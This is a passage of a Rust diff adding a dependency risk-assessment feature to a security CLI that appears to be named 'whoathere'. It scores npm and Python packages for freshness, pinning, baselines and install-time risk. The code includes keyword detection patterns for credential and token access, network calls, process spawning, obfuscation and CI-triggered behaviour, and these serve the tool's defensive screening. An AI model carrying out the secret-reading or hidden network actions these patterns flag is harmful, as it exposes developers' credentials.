+        all_freshness_allowed,
+        all_diff_clean_or_baseline_absent,
+        overall_verdict,
+        reason_codes: &summary_reasons,
+        receipt_write_status: &receipt_write_status,
+        store_status: &store_status,
+        json,
+    })
+}
+
+fn render_package_risk_history(
+    package: Option<&str>,
+    ecosystem: Option<&str>,
+    state_dir: Option<&str>,
+    json: bool,
+) -> String {
+    let Some(package) = package else {
+        return package_risk_error("package_risk_package_required", json);
+    };
+    let ecosystem = match PackageRiskEcosystem::parse(ecosystem.unwrap_or("auto")) {
+        Some(PackageRiskEcosystem::Auto) | None => {
+            return package_risk_error("package_risk_history_ecosystem_required", json)
+        }
+        Some(parsed) => parsed,
+    };
+    let config = macos_vm_config(state_dir, None, None);
+    let records = load_package_risk_memory(&config.state_dir)
+        .into_iter()
+        .filter(|record| record.ecosystem == ecosystem && record.package_name == package)
+        .collect::<Vec<_>>();
+    let exit_code = ExitCode::Allow.code();
+    if json {
+        let records_json = records
+            .iter()
+            .map(render_package_risk_memory_record_json)
+            .collect::<Vec<_>>()
+            .join(", ");
+        return format!(
+            "{{\n  \"command\": \"whoathere package-risk history\",\n  \"schema_version\": {},\n  \"package\": {},\n  \"ecosystem\": {},\n  \"store_path\": {},\n  \"record_count\": {},\n  \"records\": [{}],\n  \"exit_code\": {}\n}}",
+            json_string(PACKAGE_RISK_STORE_SCHEMA),
+            json_string(package),
+            json_string(ecosystem.as_str()),
+            json_string(&redacted_package_risk_path(&package_risk_store_path(&config.state_dir))),
+            records.len(),
+            records_json,
+            exit_code
+        );
+    }
+    let rows = records
+        .iter()
+        .map(render_package_risk_memory_record_text)
+        .collect::<Vec<_>>()
+        .join("\n");
+    format!(
+        "whoathere package-risk history\nschema_version={}\npackage={}\necosystem={}\nstore_path={}\nrecord_count={}\n{}\nexit_code={}",
+        PACKAGE_RISK_STORE_SCHEMA,
+        package,
+        ecosystem.as_str(),
+        redacted_package_risk_path(&package_risk_store_path(&config.state_dir)),
+        records.len(),
+        rows,
+        exit_code
+    )
+}
+
+fn render_package_risk_approve(
+    receipt: Option<&str>,
+    reason: Option<&str>,
+    state_dir: Option<&str>,
+    json: bool,
+) -> String {
+    let Some(receipt) = receipt else {
+        return package_risk_error("package_risk_receipt_required", json);
+    };
+    let Some(reason) = reason.filter(|value| !value.trim().is_empty()) else {
+        return package_risk_error("package_risk_approval_reason_required", json);
+    };
+    let receipt_path = Path::new(receipt);
+    let contents = match std::fs::read_to_string(receipt_path) {
+        Ok(contents) => contents,
+        Err(_) => return package_risk_error("package_risk_receipt_unreadable", json),
+    };
+    let package_objects = json_extract_object_array(&contents, "packages");
+    if package_objects.is_empty() {
+        return package_risk_error("package_risk_receipt_has_no_packages", json);
+    }
+    let config = macos_vm_config(state_dir, None, None);
+    let receipt_id = json_extract_string_field(&contents, "receipt_id")
+        .unwrap_or_else(|| package_risk_receipt_id(receipt_path, current_unix_seconds()));
+    let mut approved_records = Vec::new();
+    for object in package_objects {
+        let Some(record) = package_risk_approval_record_from_receipt_object(
+            &object,
+            &receipt_id,
+            reason,
+            current_unix_seconds(),
+        ) else {
+            return package_risk_error("package_risk_receipt_package_invalid", json);
+        };
+        if record.verdict == PackageRiskVerdict::Deny.as_str() {
+            return package_risk_error("package_risk_approve_denied_receipt_refused", json);
+        }
+        approved_records.push(record);
+    }
+    for record in &approved_records {
+        if append_package_risk_store_record(&config.state_dir, record).is_err() {
+            return package_risk_error("package_risk_store_append_failed", json);
+        }
+    }
+    if json {
+        return format!(
+            "{{\n  \"command\": \"whoathere package-risk approve\",\n  \"schema_version\": {},\n  \"receipt\": {},\n  \"approved_count\": {},\n  \"approval_reason_sha256\": {},\n  \"store_path\": {},\n  \"exit_code\": 0\n}}",
+            json_string(PACKAGE_RISK_STORE_SCHEMA),
+            json_string(&redacted_package_risk_path(receipt_path)),
+            approved_records.len(),
+            json_string(&sha256_digest(reason.as_bytes())),
+            json_string(&redacted_package_risk_path(&package_risk_store_path(&config.state_dir)))
+        );
+    }
+    format!(
+        "whoathere package-risk approve\nschema_version={}\nreceipt={}\napproved_count={}\napproval_reason_sha256={}\nstore_path={}\nexit_code=0",
+        PACKAGE_RISK_STORE_SCHEMA,
+        redacted_package_risk_path(receipt_path),
+        approved_records.len(),
+        sha256_digest(reason.as_bytes()),
+        redacted_package_risk_path(&package_risk_store_path(&config.state_dir))
+    )
+}
+
+fn package_risk_error(reason_code: &str, json: bool) -> String {
+    if json {
+        return format!(
+            "{{\n  \"command\": \"whoathere package-risk\",\n  \"schema_version\": {},\n  \"status\": \"error\",\n  \"reason_code\": {},\n  \"exit_code\": {}\n}}",
+            json_string(PACKAGE_RISK_ASSESSMENT_SCHEMA),
+            json_string(reason_code),
+            ExitCode::Misuse.code()
+        );
+    }
+    format!(
+        "whoathere package-risk\nschema_version={}\nstatus=error\nreason_code={reason_code}\nexit_code={}",
+        PACKAGE_RISK_ASSESSMENT_SCHEMA,
+        ExitCode::Misuse.code()
+    )
+}
+
+struct PackageRiskSummaryRender<'a> {
+    requested_ecosystem: PackageRiskEcosystem,
+    state_dir: &'a Path,
+    receipt_path: &'a Path,
+    receipt_id: &'a str,
+    assessments: &'a [PackageRiskAssessment],
+    all_freshness_allowed: bool,
+    all_diff_clean_or_baseline_absent: bool,
+    overall_verdict: PackageRiskVerdict,
+    reason_codes: &'a [String],
+    receipt_write_status: &'a str,
+    store_status: &'a str,
+    json: bool,
+}
+
+fn render_package_risk_assessment_summary(view: PackageRiskSummaryRender<'_>) -> String {
+    let exit_code = view.overall_verdict.exit_code();
+    if view.json {
+        let packages_json = view
+            .assessments
+            .iter()
+            .map(render_package_risk_package_json)
+            .collect::<Vec<_>>()
+            .join(", ");
+        return format!(
+            "{{\n  \"command\": \"whoathere package-risk assess\",\n  \"schema_version\": {},\n  \"requested_ecosystem\": {},\n  \"cooldown_days\": {},\n  \"store_path\": {},\n  \"receipt_path\": {},\n  \"receipt_id\": {},\n  \"receipt_write_status\": {},\n  \"store_status\": {},\n  \"package_count\": {},\n  \"overall_verdict\": {},\n  \"all_freshness_allowed\": {},\n  \"all_diff_clean_or_baseline_absent\": {},\n  \"reason_codes\": {},\n  \"packages\": [{}],\n  \"exit_code\": {}\n}}",
+            json_string(PACKAGE_RISK_ASSESSMENT_SCHEMA),
+            json_string(view.requested_ecosystem.as_str()),
+            PACKAGE_RISK_COOLDOWN_DAYS,
+            json_string(&redacted_package_risk_path(&package_risk_store_path(view.state_dir))),
+            json_string(&redacted_package_risk_path(view.receipt_path)),
+            json_string(view.receipt_id),
+            json_string(view.receipt_write_status),
+            json_string(view.store_status),
+            view.assessments.len(),
+            json_string(view.overall_verdict.as_str()),
+            view.all_freshness_allowed,
+            view.all_diff_clean_or_baseline_absent,
+            json_string_array(view.reason_codes),
+            packages_json,
+            exit_code
+        );
+    }
+    let rows = view
+        .assessments
+        .iter()
+        .map(render_package_risk_package_text)
+        .collect::<Vec<_>>()
+        .join("\n");
+    format!(
+        "whoathere package-risk assess\nschema_version={}\nrequested_ecosystem={}\ncooldown_days={}\nstore_path={}\nreceipt_path={}\nreceipt_id={}\nreceipt_write_status={}\nstore_status={}\npackage_count={}\noverall_verdict={}\nall_freshness_allowed={}\nall_diff_clean_or_baseline_absent={}\nreason_codes={:?}\n{}\nexit_code={}",
+        PACKAGE_RISK_ASSESSMENT_SCHEMA,
+        view.requested_ecosystem.as_str(),
+        PACKAGE_RISK_COOLDOWN_DAYS,
+        redacted_package_risk_path(&package_risk_store_path(view.state_dir)),
+        redacted_package_risk_path(view.receipt_path),
+        view.receipt_id,
+        view.receipt_write_status,
+        view.store_status,
+        view.assessments.len(),
+        view.overall_verdict.as_str(),
+        view.all_freshness_allowed,
+        view.all_diff_clean_or_baseline_absent,
+        view.reason_codes,
+        rows,
+        exit_code
+    )
+}
+
+fn render_package_risk_package_json(assessment: &PackageRiskAssessment) -> String {
+    format!(
+        "{{\"ecosystem\": {}, \"package_name\": {}, \"requested_spec\": {}, \"resolved_version\": {}, \"selected_version\": {}, \"source_kind\": {}, \"package_class\": {}, \"artifact_hash\": {}, \"pinned\": {}, \"last_known_good_version\": {}, \"last_known_good_hash\": {}, \"last_known_good_used\": {}, \"publish_age_days\": {}, \"freshness_allowed\": {}, \"diff_clean_or_baseline_absent\": {}, \"reputation_status\": {}, \"indicators\": {}, \"verdict\": {}, \"reason_codes\": {}}}",
+        json_string(assessment.ecosystem.as_str()),
+        json_string(&assessment.package_name),
+        json_string(&assessment.requested_spec),
+        json_option_string(assessment.resolved_version.as_deref()),
+        json_option_string(assessment.selected_version.as_deref()),
+        json_string(&assessment.source_kind),
+        json_string(assessment.package_class.as_str()),
+        json_string(&assessment.artifact_hash),
+        assessment.pinned,
+        json_option_string(assessment.last_known_good_version.as_deref()),
+        json_option_string(assessment.last_known_good_hash.as_deref()),
+        assessment.last_known_good_used,
+        json_option(assessment.publish_age_days),
+        assessment.freshness_allowed,
+        assessment.diff_clean_or_baseline_absent,
+        json_string(&assessment.reputation_status),
+        json_string_array(&assessment.indicators),
+        json_string(assessment.verdict.as_str()),
+        json_string_array(&assessment.reason_codes)
+    )
+}
+
+fn render_package_risk_package_text(assessment: &PackageRiskAssessment) -> String {
+    format!(
+        "package_risk package={} ecosystem={} requested_spec={} resolved_version={} selected_version={} source_kind={} package_class={} artifact_hash={} pinned={} last_known_good_version={} last_known_good_used={} publish_age_days={} freshness_allowed={} diff_clean_or_baseline_absent={} reputation_status={} indicators={:?} verdict={} reason_codes={:?}",
+        assessment.package_name,
+        assessment.ecosystem.as_str(),
+        redacted_scalar(&assessment.requested_spec),
+        assessment.resolved_version.as_deref().unwrap_or("none"),
+        assessment.selected_version.as_deref().unwrap_or("none"),
+        assessment.source_kind,
+        assessment.package_class.as_str(),
+        assessment.artifact_hash,
+        assessment.pinned,
+        assessment
+            .last_known_good_version
+            .as_deref()
+            .unwrap_or("none"),
+        assessment.last_known_good_used,
+        assessment
+            .publish_age_days
+            .map(|days| days.to_string())
+            .unwrap_or_else(|| "unknown".to_string()),
+        assessment.freshness_allowed,
+        assessment.diff_clean_or_baseline_absent,
+        assessment.reputation_status,
+        assessment.indicators,
+        assessment.verdict.as_str(),
+        assessment.reason_codes
+    )
+}
+
+fn discover_package_risk_subjects(
+    workspace: &Path,
+    requested_ecosystem: PackageRiskEcosystem,
+) -> Vec<PackageRiskSubject> {
+    let mut subjects = Vec::new();
+    if matches!(
+        requested_ecosystem,
+        PackageRiskEcosystem::Auto | PackageRiskEcosystem::Npm
+    ) && workspace.join("package.json").is_file()
+    {
+        subjects.extend(discover_npm_package_risk_subjects(workspace));
+    }
+    if matches!(
+        requested_ecosystem,
+        PackageRiskEcosystem::Auto | PackageRiskEcosystem::Pypi | PackageRiskEcosystem::Uv
+    ) {
+        subjects.extend(discover_python_package_risk_subjects(
+            workspace,
+            requested_ecosystem,
+        ));
+    }
+    subjects.sort_by(|left, right| {
+        left.ecosystem
+            .as_str()
+            .cmp(right.ecosystem.as_str())
+            .then(left.package_name.cmp(&right.package_name))
+            .then(left.requested_spec.cmp(&right.requested_spec))
+    });
+    subjects.dedup_by(|left, right| {
+        left.ecosystem == right.ecosystem
+            && left.package_name == right.package_name
+            && left.requested_spec == right.requested_spec
+    });
+    subjects
+}
+
+fn discover_npm_package_risk_subjects(workspace: &Path) -> Vec<PackageRiskSubject> {
+    let package_json_path = workspace.join("package.json");
+    let contents = std::fs::read_to_string(&package_json_path).unwrap_or_default();
+    let mut indicators = npm_package_risk_indicators(workspace, &contents);
+    indicators.sort();
+    indicators.dedup();
+    let publish_age_days = json_extract_u64_field(&contents, "whoatherePublishedAtUnixSeconds")
+        .and_then(publish_age_days_from_unix);
+    let reputation_status =
+        if contents.contains("\"repository\"") || contents.contains("\"homepage\"") {
+            "local_repository_metadata_present".to_string()
+        } else {
+            "reputation_metadata_missing".to_string()
+        };
+    let mut subjects = Vec::new();
+    let root_name = json_extract_string_field(&contents, "name")
+        .unwrap_or_else(|| "workspace-package".to_string());
+    let root_version = json_extract_string_field(&contents, "version");
+    let root_spec = root_version
+        .as_deref()
+        .map(|version| format!("=={version}"))
+        .unwrap_or_else(|| "workspace".to_string());
+    let root_class = if indicators
+        .iter()
+        .any(|indicator| indicator.contains("native"))
+    {
+        PackageClass::NativeExtension
+    } else {
+        PackageClass::NpmRegistryTarball
+    };
+    subjects.push(PackageRiskSubject {
+        ecosystem: PackageRiskEcosystem::Npm,
+        package_name: root_name,
+        requested_spec: root_spec.clone(),
+        resolved_version: root_version,
+        source_kind: "registry".to_string(),
+        package_class: root_class,
+        artifact_hash: package_risk_artifact_hash("npm", &root_spec, &contents, &indicators),
+        pinned: true,
+        publish_age_days,
+        reputation_status: reputation_status.clone(),
+        indicators: indicators.clone(),
+    });
+    for field in [
+        "dependencies",
+        "devDependencies",
+        "optionalDependencies",
+        "peerDependencies",
+    ] {
+        for (name, spec) in json_extract_object_string_pairs(&contents, field) {
+            let source_kind = npm_spec_source_kind(&spec);
+            let package_class = package_class_for_source_kind("npm", &source_kind);
+            let pinned = npm_spec_is_exact(&spec);
+            let resolved_version = if pinned {
+                Some(spec.trim_start_matches('=').to_string())
+            } else {
+                None
+            };
+            let mut dep_indicators = Vec::new();
+            if source_kind != "registry" {
+                dep_indicators.push(format!("dependency_source_{source_kind}"));
+            }
+            subjects.push(PackageRiskSubject {
+                ecosystem: PackageRiskEcosystem::Npm,
+                package_name: name.clone(),
+                requested_spec: spec.clone(),
+                resolved_version,
+                source_kind,
+                package_class,
+                artifact_hash: package_risk_artifact_hash(
+                    "npm",
+                    &format!("{name}@{spec}"),
+                    &contents,
+                    &dep_indicators,
+                ),
+                pinned,
+                publish_age_days: None,
+                reputation_status: "reputation_metadata_missing".to_string(),
+                indicators: dep_indicators,
+            });
+        }
+    }
+    subjects
+}
+
+fn discover_python_package_risk_subjects(
+    workspace: &Path,
+    requested_ecosystem: PackageRiskEcosystem,
+) -> Vec<PackageRiskSubject> {
+    let mut subjects = Vec::new();
+    let effective_ecosystem = if requested_ecosystem == PackageRiskEcosystem::Uv {
+        PackageRiskEcosystem::Uv
+    } else {
+        PackageRiskEcosystem::Pypi
+    };
+    for requirements in package_risk_requirements_files(workspace) {
+        let contents = std::fs::read_to_string(&requirements).unwrap_or_default();
+        for raw_line in contents.lines() {
+            let line = raw_line.split('#').next().unwrap_or("").trim();
+            if line.is_empty()
+                || line.starts_with('-')
+                    && !line.starts_with("-e ")
+                    && !line.starts_with("--editable")
+            {
+                continue;
+            }
+            let marker_text = raw_line.split('#').nth(1).unwrap_or("");
+            let Some((name, spec)) = parse_requirement_name_spec(line) else {
+                continue;
+            };
+            let source_kind = python_spec_source_kind(line);
+            let package_class =
+                package_class_for_source_kind(effective_ecosystem.as_str(), &source_kind);
+            let pinned = python_spec_is_exact(&spec);
+            let resolved_version = if pinned {
+                Some(spec.trim_start_matches("==").to_string())
+            } else {
+                None
+            };
+            let publish_age_days = marker_value_u64(marker_text, "whoathere-published-at")
+                .and_then(publish_age_days_from_unix);
+            let mut indicators = Vec::new();
+            if source_kind != "registry" {
+                indicators.push(format!("dependency_source_{source_kind}"));
+            }
+            subjects.push(PackageRiskSubject {
+                ecosystem: effective_ecosystem,
+                package_name: name.clone(),
+                requested_spec: spec.clone(),
+                resolved_version,
+                source_kind,
+                package_class,
+                artifact_hash: package_risk_artifact_hash(
+                    effective_ecosystem.as_str(),
+                    &format!("{name}{spec}"),
+                    &contents,
+                    &indicators,
+                ),
+                pinned,
+                publish_age_days,
+                reputation_status: "reputation_metadata_missing".to_string(),
+                indicators,
+            });
+        }
+    }
+
+    if workspace.join("pyproject.toml").is_file() || workspace.join("setup.py").is_file() {
+        let pyproject =
+            std::fs::read_to_string(workspace.join("pyproject.toml")).unwrap_or_default();
+        let setup_py = std::fs::read_to_string(workspace.join("setup.py")).unwrap_or_default();
+        let mut indicators = python_workspace_risk_indicators(workspace, &pyproject, &setup_py);
+        indicators.sort();
+        indicators.dedup();
+        let name = toml_like_string_field(&pyproject, "name")
+            .unwrap_or_else(|| "workspace-python-package".to_string());
+        let version = toml_like_string_field(&pyproject, "version");
+        let spec = version
+            .as_deref()
+            .map(|version| format!("=={version}"))
+            .unwrap_or_else(|| "workspace".to_string());
+        let package_class = if indicators
+            .iter()
+            .any(|indicator| indicator.contains("native"))
+        {
+            PackageClass::NativeExtension
+        } else if indicators
+            .iter()
+            .any(|indicator| indicator == "pypi_pep517_build_backend")
+        {
+            PackageClass::PypiSdistPep517
+        } else {
+            PackageClass::PypiPureWheel
+        };
+        let publish_age_days = toml_like_u64_field(&pyproject, "whoathere-published-at")
+            .and_then(publish_age_days_from_unix);
+        let reputation_status = if pyproject.contains("Repository")
+            || pyproject.contains("repository")
+            || pyproject.contains("Homepage")
+        {
+            "local_repository_metadata_present".to_string()
+        } else {
+            "reputation_metadata_missing".to_string()
+        };
+        subjects.push(PackageRiskSubject {
+            ecosystem: effective_ecosystem,
+            package_name: name,
+            requested_spec: spec.clone(),
+            resolved_version: version,
+            source_kind: "registry".to_string(),
+            package_class,
+            artifact_hash: package_risk_artifact_hash(
+                effective_ecosystem.as_str(),
+                &spec,
+                &(pyproject + &setup_py),
+                &indicators,
+            ),
+            pinned: true,
+            publish_age_days,
+            reputation_status,
+            indicators,
+        });
+    }
+    subjects
+}
+
+fn assess_package_risk_subject(
+    subject: &PackageRiskSubject,
+    memory: &[PackageRiskMemoryRecord],
+) -> PackageRiskAssessment {
+    let mut reason_codes = Vec::new();
+    let baseline = find_last_known_good(subject, memory);
+    let selected_version = if !subject.pinned {
+        baseline.as_ref().and_then(|record| {
+            record
+                .selected_version
+                .clone()
+                .or(record.resolved_version.clone())
+        })
+    } else {
+        subject.resolved_version.clone()
+    };
+    let last_known_good_used = !subject.pinned && selected_version.is_some();
+    if last_known_good_used {
+        reason_codes.push("last_known_good_substitution_selected".to_string());
+    }
+    if !subject.pinned && selected_version.is_none() {
+        reason_codes.push("unpinned_no_last_known_good".to_string());
+    }
+    if subject.indicators.is_empty() {
+        reason_codes.push("package_risk_no_static_high_risk_indicator".to_string());
+    } else {
+        reason_codes.extend(subject.indicators.iter().cloned());
+    }
+
+    let baseline_hash = baseline.as_ref().map(|record| record.artifact_hash.clone());
+    let exact_baseline_match = baseline_hash
+        .as_deref()
+        .is_some_and(|hash| hash == subject.artifact_hash);
+    let freshness_allowed = if exact_baseline_match || last_known_good_used {
+        true
+    } else if let Some(days) = subject.publish_age_days {
+        if days >= PACKAGE_RISK_COOLDOWN_DAYS {
+            true
+        } else {
+            reason_codes.push("fresh_release_cooldown_active".to_string());
+            false
+        }
+    } else {
+        reason_codes.push("package_publish_time_missing".to_string());
+        false
+    };
+    let suspicious = subject
+        .indicators
+        .iter()
+        .any(|indicator| package_risk_indicator_blocks_auto_sync(indicator));
+    let diff_clean_or_baseline_absent = if exact_baseline_match {
+        reason_codes.push("last_known_good_exact_artifact_match".to_string());
+        true
+    } else if baseline.is_some() {
+        if suspicious {
+            reason_codes.push("known_good_diff_suspicious".to_string());
+            false
+        } else {
+            reason_codes.push("known_good_diff_changed_low_risk".to_string());
+            true
+        }
+    } else if subject.pinned
+        && subject.package_class.auto_sync_eligible()
+        && !suspicious
+        && freshness_allowed
+    {
+        reason_codes.push("baseline_absent_pinned_clean_candidate".to_string());
+        true
+    } else {
+        reason_codes.push("baseline_absent_requires_review".to_string());
+        false
+    };
+    if subject.reputation_status == "reputation_metadata_missing" {
+        reason_codes.push("reputation_metadata_missing".to_string());
+    }
+    match subject.package_class {
+        PackageClass::NpmRegistryTarball | PackageClass::PypiPureWheel => {}
+        PackageClass::PypiSdistPep517 => {
+            reason_codes.push("pypi_sdist_or_pep517_requires_manual_review".to_string())
+        }
+        PackageClass::PypiBinaryWheel => {
+            reason_codes.push("binary_wheel_requires_manual_review".to_string())
+        }
+        PackageClass::NativeExtension => {
+            reason_codes.push("native_extension_requires_manual_review".to_string())
+        }
+        PackageClass::DirectVcsEditable => {
+            reason_codes.push("direct_vcs_editable_denied_by_default".to_string())
+        }
+        PackageClass::UnsupportedUnknown => {
+            reason_codes.push("unsupported_package_class_denied_by_default".to_string())
+        }
+    }
+
+    let verdict = if matches!(
+        subject.package_class,
+        PackageClass::DirectVcsEditable | PackageClass::UnsupportedUnknown
+    ) {
+        PackageRiskVerdict::Deny
+    } else if !subject.package_class.auto_sync_eligible()
+        || !subject.pinned && selected_version.is_none()
+        || suspicious
+        || !freshness_allowed
+        || !diff_clean_or_baseline_absent
+    {
+        PackageRiskVerdict::ManualReview
+    } else {
+        PackageRiskVerdict::AutoSyncCandidate
+    };
+
+    reason_codes.sort();
+    reason_codes.dedup();
+    PackageRiskAssessment {
+        ecosystem: subject.ecosystem,
+        package_name: subject.package_name.clone(),
+        requested_spec: subject.requested_spec.clone(),
+        resolved_version: subject.resolved_version.clone(),
+        selected_version,
+        source_kind: subject.source_kind.clone(),
+        package_class: subject.package_class,
+        artifact_hash: subject.artifact_hash.clone(),
+        pinned: subject.pinned,
+        last_known_good_version: baseline.as_ref().and_then(|record| {
+            record
+                .selected_version
+                .clone()
+                .or(record.resolved_version.clone())
+        }),
+        last_known_good_hash: baseline_hash,
+        last_known_good_used,
+        publish_age_days: subject.publish_age_days,
+        freshness_allowed,
+        diff_clean_or_baseline_absent,
+        reputation_status: subject.reputation_status.clone(),
+        indicators: subject.indicators.clone(),
+        verdict,
+        reason_codes,
+    }
+}
+
+fn package_risk_indicator_blocks_auto_sync(indicator: &str) -> bool {
+    indicator.contains("lifecycle")
+        || indicator.contains("postinstall")
+        || indicator.contains("prepare")
+        || indicator.contains("credential")
+        || indicator.contains("network")
+        || indicator.contains("native")
+        || indicator.contains("binary")
+        || indicator.contains("pth")
+        || indicator.contains("import_hook")
+        || indicator.contains("dependency_source_")
+        || indicator.contains("platform_specific")
+        || indicator.contains("obfuscated")
+}
+
+fn package_risk_overall_verdict(assessments: &[PackageRiskAssessment]) -> PackageRiskVerdict {
+    if assessments.is_empty()
+        || assessments
+            .iter()
+            .any(|assessment| assessment.verdict == PackageRiskVerdict::Deny)
+    {
+        PackageRiskVerdict::Deny
+    } else if assessments
+        .iter()
+        .any(|assessment| assessment.verdict == PackageRiskVerdict::ManualReview)
+    {
+        PackageRiskVerdict::ManualReview
+    } else {
+        PackageRiskVerdict::AutoSyncCandidate
+    }
+}
+
+fn package_risk_summary_reasons(assessments: &[PackageRiskAssessment]) -> Vec<String> {
+    let mut reasons = assessments
+        .iter()
+        .flat_map(|assessment| assessment.reason_codes.iter().cloned())
+        .collect::<Vec<_>>();
+    reasons.sort();
+    reasons.dedup();
+    reasons
+}
+
+fn find_last_known_good<'a>(
+    subject: &PackageRiskSubject,
+    memory: &'a [PackageRiskMemoryRecord],
+) -> Option<&'a PackageRiskMemoryRecord> {
+    let mut candidates = memory
+        .iter()
+        .filter(|record| {
+            record.approved
+                && record.ecosystem == subject.ecosystem
+                && record.package_name == subject.package_name
+        })
+        .collect::<Vec<_>>();
+    candidates.sort_by(|left, right| {
+        package_version_sort_key(
+            right
+                .selected_version
+                .as_deref()
+                .or(right.resolved_version.as_deref()),
+        )
+        .cmp(&package_version_sort_key(
+            left.selected_version
+                .as_deref()
+                .or(left.resolved_version.as_deref()),
+        ))
+        .then(
+            right
+                .created_at_unix_seconds
+                .cmp(&left.created_at_unix_seconds),
+        )
+    });
+    if subject.pinned {
+        candidates.into_iter().find(|record| {
+            record.artifact_hash == subject.artifact_hash
+                || record
+                    .resolved_version
+                    .as_deref()
+                    .is_some_and(|version| Some(version) == subject.resolved_version.as_deref())
+        })
+    } else {
+        candidates.into_iter().next()
+    }
+}
+
+fn package_version_sort_key(version: Option<&str>) -> Vec<u64> {
+    version
+        .unwrap_or("")
+        .split(|character: char| !character.is_ascii_digit())
+        .filter(|part| !part.is_empty())
+        .map(|part| part.parse::<u64>().unwrap_or(0))
+        .collect()
+}
+
+fn npm_package_risk_indicators(workspace: &Path, package_json: &str) -> Vec<String> {
+    let mut indicators = Vec::new();
+    for script in [
+        "preinstall",
+        "install",
+        "postinstall",
+        "prepare",
+        "prepublish",
+    ] {
+        if package_json.contains(&format!("\"{script}\"")) {
+            indicators.push(format!("npm_lifecycle_script_{script}"));
+        }
+    }
+    if package_json.contains("\"bin\"") {
+        indicators.push("npm_bin_entry_declared".to_string());
+    }
+    if package_json.contains("binding.gyp") || workspace.join("binding.gyp").is_file() {
+        indicators.push("native_extension_marker".to_string());
+    }
+    indicators.extend(source_text_risk_indicators(package_json));
+    indicators.extend(workspace_file_risk_indicators(workspace, "npm"));
+    indicators
+}
+
+fn python_workspace_risk_indicators(
+    workspace: &Path,
+    pyproject: &str,
+    setup_py: &str,
+) -> Vec<String> {
+    let mut indicators = Vec::new();
+    if pyproject.contains("[build-system]") || !setup_py.is_empty() {
+        indicators.push("pypi_pep517_build_backend".to_string());
+    }
+    indicators.extend(source_text_risk_indicators(pyproject));
+    indicators.extend(source_text_risk_indicators(setup_py));
+    indicators.extend(workspace_file_risk_indicators(workspace, "pypi"));
+    indicators
+}
+
+fn workspace_file_risk_indicators(workspace: &Path, ecosystem: &str) -> Vec<String> {
+    let mut indicators = Vec::new();
+    collect_workspace_file_risk_indicators(workspace, workspace, ecosystem, &mut indicators, 0);
+    indicators.sort();
+    indicators.dedup();
+    indicators
+}
+
+fn collect_workspace_file_risk_indicators(
+    root: &Path,
+    current: &Path,
+    ecosystem: &str,
+    indicators: &mut Vec<String>,
+    depth: usize,
+) {
+    if depth > 4 {
+        return;
+    }
+    let Ok(entries) = std::fs::read_dir(current) else {
+        return;
+    };
+    for entry in entries.flatten() {
+        let path = entry.path();
+        let name = entry.file_name();
+        let name = name.to_string_lossy();
+        if name.starts_with(".git") || name == "node_modules" || name == ".venv" {
+            continue;
+        }
+        if path.is_dir() {
+            collect_workspace_file_risk_indicators(root, &path, ecosystem, indicators, depth + 1);
+            continue;
+        }
+        let lowered = name.to_ascii_lowercase();
+        if lowered.ends_with(".pth") {
+            indicators.push("python_pth_startup_hook".to_string());
+        }
+        if lowered.ends_with(".so")
+            || lowered.ends_with(".dylib")
+            || lowered.ends_with(".dll")
+            || lowered.ends_with(".pyd")
+            || lowered.ends_with(".node")
+            || lowered.ends_with(".o")
+            || lowered.ends_with(".a")
+            || lowered.ends_with(".whl")
+        {
+            indicators.push("native_or_binary_payload_marker".to_string());
+        }
+        if lowered.contains("darwin") || lowered.contains("macos") || lowered.contains("osx") {
+            indicators.push("platform_specific_macos_marker".to_string());
+        }
+        if let Ok(relative) = path.strip_prefix(root) {
+            if relative.components().count() <= 4 {
+                if let Ok(contents) = std::fs::read_to_string(&path) {
+                    indicators.extend(source_text_risk_indicators(&contents));
+                }
+            }
+        }
+        if ecosystem == "npm" && lowered == "binding.gyp" {
+            indicators.push("native_extension_marker".to_string());
+        }
+    }
+}
+
+fn source_text_risk_indicators(contents: &str) -> Vec<String> {
+    let lowered = contents.to_ascii_lowercase();
+    let mut indicators = Vec::new();
+    if lowered.contains("process.env")
+        || lowered.contains("os.environ")
+        || lowered.contains("getenv(")
+        || lowered.contains("npm_token")
+        || lowered.contains("pypi_token")
+        || lowered.contains("github_token")
+        || lowered.contains("aws_secret")
+    {
+        indicators.push("credential_or_environment_access".to_string());
+    }
+    if lowered.contains("https://")
+        || lowered.contains("http://")
+        || lowered.contains("fetch(")
+        || lowered.contains("requests.")
+        || lowered.contains("urllib")
+        || lowered.contains("socket.")
+        || lowered.contains("dns.")
+    {
+        indicators.push("network_capability_observed".to_string());
+    }
+    if lowered.contains("child_process")
+        || lowered.contains("subprocess")
+        || lowered.contains("exec(")
+        || lowered.contains("spawn(")
+    {
+        indicators.push("process_spawn_capability_observed".to_string());
+    }
+    if lowered.contains("eval(")
+        || lowered.contains("function(")
+        || lowered.contains("base64")
+        || lowered.contains("fromcharcode")
+    {
+        indicators.push("obfuscated_or_dynamic_code_marker".to_string());
+    }
+    if lowered.contains("ci=true")
+        || lowered.contains("process.env.ci")
+        || lowered.contains("os.environ.get(\"ci\"")
+    {
+        indicators.push("delayed_ci_activation_marker".to_string());
+    }
+    indicators
+}
+
+fn package_risk_requirements_files(workspace: &Path) -> Vec<PathBuf> {
+    let Ok(entries) = std::fs::read_dir(workspace) else {
+        return Vec::new();
+    };
+    let mut files = entries
+        .flatten()
+        .map(|entry| entry.path())
+        .filter(|path| {
+            path.file_name()
+                .and_then(|name| name.to_str())
+                .is_some_and(|name| {
+                    (name.starts_with("requirements") && name.ends_with(".txt"))
+                        || name == "constraints.txt"
+                })
+        })
+        .collect::<Vec<_>>();
+    files.sort();
+    files
+}
+
+fn parse_requirement_name_spec(line: &str) -> Option<(String, String)> {
+    let trimmed = line.trim();
+    if trimmed.starts_with("-e ") || trimmed.starts_with("--editable") {
+        let value = trimmed
+            .trim_start_matches("-e")
+            .trim_start_matches("--editable")
+            .trim();
+        return Some((package_name_from_direct_ref(value), "editable".to_string()));
+    }
+    if trimmed.contains("://") || trimmed.starts_with("git+") {
+        return Some((package_name_from_direct_ref(trimmed), trimmed.to_string()));
+    }
+    let operators = ["==", ">=", "<=", "~=", "!=", ">", "<"];
+    for operator in operators {
+        if let Some((name, version)) = trimmed.split_once(operator) {
+            let name = normalize_package_name(name.trim());
+            if !name.is_empty() {
+                return Some((name, format!("{operator}{}", version.trim())));
+            }
+        }
+    }
+    let name = normalize_package_name(trimmed);
+    if name.is_empty() {
+        None
+    } else {
+        Some((name, "*".to_string()))
+    }
+}
+
+fn normalize_package_name(value: &str) -> String {
+    value
+        .split(['[', ';', ' ', '\t'])
+        .next()
+        .unwrap_or("")
+        .trim()
+        .replace('_', "-")
+        .to_ascii_lowercase()
+}
+
+fn package_name_from_direct_ref(value: &str) -> String {
